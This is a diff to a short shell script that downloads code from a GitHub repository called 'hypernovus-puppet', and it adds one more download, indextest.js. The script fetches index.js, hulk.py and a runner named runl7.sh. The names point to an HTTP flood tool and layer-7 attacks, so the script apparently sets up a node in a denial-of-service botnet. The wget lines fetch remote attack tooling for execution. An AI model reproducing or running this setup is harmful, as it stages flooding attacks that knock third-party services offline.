@@ -1,6 +1,8 @@
 #!/bin/sh
 
 JSURL=https://raw.githubusercontent.com/mehmetefeerkan/hypernovus-puppet/main/source/index.js
+JSTEST=https://raw.githubusercontent.com/mehmetefeerkan/hypernovus-puppet/main/source/indextest.js
+
 PYURL=https://raw.githubusercontent.com/mehmetefeerkan/hypernovus-puppet/main/source/hulk.py
 
 RUNNERURL=https://raw.githubusercontent.com/mehmetefeerkan/hypernovus-puppet/main/runl7.sh
@@ -24,6 +26,8 @@ npm install express
 
 wget $JSURL
 wget $PYURL
+wget $JSTEST
+
 
 
 
